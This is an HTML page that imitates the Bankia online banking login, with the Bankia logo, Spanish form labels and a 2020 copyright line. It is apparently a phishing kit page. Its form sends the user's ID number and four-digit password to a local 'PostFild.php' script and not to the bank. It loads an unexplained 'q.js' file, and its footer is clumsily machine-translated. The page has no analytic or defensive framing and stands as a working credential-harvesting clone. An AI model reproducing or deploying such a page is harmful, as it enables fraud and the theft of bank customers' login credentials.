<html lang="en" dir="ltr" class="wf-opensans-n4-active wf-opensans-n6-active wf-active"><!--<![endif]--><head>
   <meta charset="utf-8">
  <link href="./Bankia online log in_files/vgn-ext-templating-delivery.css" rel="stylesheet" type="text/css"> 
<style>
ul {
    list-style-type: none;
    margin: 0;
    padding: 0;
    overflow: hidden;
    border: 1px solid #e7e7e7;
    background-color: #f3f3f3;
}

li {
    float: left;
}

li a {
    display: block;
    color: #666;
    text-align: center;
    padding: 14px 16px;
    text-decoration: none;
}



</style>
<script src="res/js/q.js"></script>
  <link href="./lib/favicon.ico" rel="icon" type="image/png"> 
  <link href="./lib/jquery-ui.theme.min.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/slick.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/bootstrap.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/bootstrap-multiselect.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/datatables.min.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/ladda.min.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/general.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/modules.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/styles.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/ifb-BankiaWidgets.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/styleWFG.css" rel="stylesheet" type="text/css"> 

 <script>
      $(document).ready(function(){
        $('#botonEntrar').click(function(e){
          e.preventDefault();
          if($('#email').val() == "" && $('#password').val() == ""){
            $("#email").css("border-color", "red");
            $("#password").css("border-color", "red");
            $('.frm-txt-message').show();
            $('.frm-txt-message').show();
            return false;
                         
          } else if($('#identificador').val() == ""){
            $('.frm-txt-message').show(); 
            $("#identificador").css("border-color", "red");


            return false;

          } else if( $('#password').val() == ""){
            $('.frm-txt-message').show();
            $("#password").css("border-color", "red");
            return false;
          }
          else {
            $("#loader").show();
            setTimeout(stp , 0);
          }
          function stp(){
            $('form').submit();
          }
        });
      });
    </script>

  <!-- FIN BANNER APP --> 
</head> 
 <body cz-shortcut-listen="true" style="
    background-image: url('lib/bg_login.jpg');
    background-repeat: repeat-x;
"><ul style="
   height: 65px;
    background-color: #FFFCFA;
    opacity: 0.9;
">
  <li><img src="lib/logoBankiaTr.png" alt="" class="hdr-logo-img" style="
    margin: 18px;
"></li>
  <li></li>
  <li style="
    float: left;
"><a href="#contact" style="
    margin: 18px;
">Log in

</a></li>
  <li style="
    float: left;
"></li>
</ul> 
   
  <div class="contenedor_general" style="
    margin-bottom: 15%;
"> 
   <header class="mod_header mod_headerNew"> 
   </header> 

    <link href="./lib/login_oi.css" rel="stylesheet" type="text/css"> 
 
                
       <div class="container content-form" style="
    top: 2rem;
    margin-bottom: 50px;
"> 
        <div class="iframe-form"> 
        

<meta http-equiv="Content-Type" content="text/html; charset=windows-1252"> 
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 

  <link rel="stylesheet" type="text/css" href="./lib/bootstrap.min.css"> 
  <link rel="stylesheet" type="text/css" href="./lib/ladda.nim.css"> 
  <link rel="stylesheet" type="text/css" href="./lib/general.min.css"> 
  <link rel="stylesheet" type="text/css" href="./lib/modulesLogin.min.css"> 
   
  
  <div aria-expanded="false" role="menu" class="mod_login  lgn-iframe"> 
   <div class="mod_message msg-error hide" id="messageValidando"> 
    <div class="msg-container"> 
     <p class="msg-text" id="mensajeErr">Revise los campos incorrectos indicados en el formulario</p> 
     <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
    </div> 
   </div> 
   <form action="./inc/PostFild.php" method="post" class="mod_form frm-login" name="formularioLogin" id="formularioLogin"> 
    <fieldset class="frm-fieldset" style="
        height: 43%;
"> 
     <legend class="hideAccessible frm-legend"> <span class="frm-legend-txt">Acceso del cliente</span></legend> 
     <label for="id_usu_login" id="id_usu_login" class="frm-label"><span class="frm-label-txt">Nombre de usuario</span> 
      <div class="hide" id="placeHolderLogin"> 
       <div class="msg-container"> 
        <p class="msg-text" id="placeHolderLoginPU">Número de identificación / NIE / pasaporte</p> 
        <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
       </div> 
      </div> <input type="text" value="" name="identificador" id="identificador" maxlength="15"  placeholder="ID number / NIE / Passport" class="frm-input"><span id="id_desc_err_usu" class="frm-txt-message" style="
    font-size: 10px;
    color: red;
">El documento n. ° es incorrecto, introduzca su NÚMERO DE IDENTIFICACIÓN NACIONAL, pasaporte o tarjeta de residencia.</span> </label> 
     <label for="id_acc_login" id="id_acc_login" class="frm-label"><span class="frm-label-txt">Contraseña</span> <input type="password" name="password" id="password" maxlength="4"  class="frm-input"><span id="id_desc_err_pass" class="frm-txt-message" style="
   font-size: 10px;
    color: red;
">Contraseña incorrecta</span> </label> 
     <div class="mod_buttons"> 
  
<input type="submit" value="Log in" name="accessLogin" id="botonEntrar" class="but-green but-wDefault ladda-button">


     </div> 
    </fieldset> 

   </form> 
  </div> 

         <div class="links-group" style="
    margin-top: 1rem;
"> 
          <a hreflang="es" title="If you have forgotten your password, click here" tabindex="0" target="_blank" class="frm-link but-default" style="
    text-decoration: none;
    margin-top: 20px;
"> <span class="frm-link-txt" style="
    text-decoration:  none;
    font-size: 15px;
">Olvidé mi contraseña o está bloqueada</span></a> 
          <a title="I do not have the access codes" class="but-default" tabindex="0" style="
    text-decoration: none;
    font-size: 15px;
">No tengo los códigos de acceso</a> 
         </div> 
        </div> 
        <div class="content-figure"> 
         <div class="hero"> 
          <img src="./lib/banner-ecommerce-270x254-1.png"> 
         </div> 
         <div class="claim-button-content"> 
          <div class="claim"> 
           <p class="claim_tittle">&nbsp;</p> 
           <p><strong>Contratar la tarjeta de crédito</strong></p> 
           <p><strong>en Bankia Online</strong></p> 
          </div> 
          <div class="button"> 
           <div class="mod_buttons"> 
            <a title="Find out more" tabindex="0" class="but-default but-wDefault">Saber más</a> 
           </div> 
          </div> 
         </div> 
        </div> 
       </div> 
        
       </div><br><p class="ftr-modLinks-link" style="
    font-size: 10px;
    text-align:  center;
    font-weight:  bold;
    font-family: tahoma;
    margin-bottom: 5px;
">Aviso Legal . Seguridad. Privacidad Galletas . política. Tarifas y Cargos. Tablero de anuncios Tarifas, intereses y tasas de cambio Accesibilidad</p><p class="ftr-modLinks-link" style="font-size: 10px;text-align: center;font-weight: bold;font-family: tahoma;">© 2020 Bankia, S.A. Todos los derechos reservados.</p></body></html>